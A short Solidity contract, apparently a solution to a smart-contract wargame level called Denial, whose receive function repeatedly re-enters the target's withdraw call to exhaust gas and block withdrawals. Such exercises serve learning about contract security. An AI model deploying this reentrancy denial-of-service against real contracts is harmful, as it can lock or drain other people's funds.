// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./Denial.sol";

contract DenialHack {
    Denial dn;

    constructor(address payable dnAddr) {
        dn = Denial(dnAddr);
    }

    receive() external payable {
        dn.withdraw();
    }
}
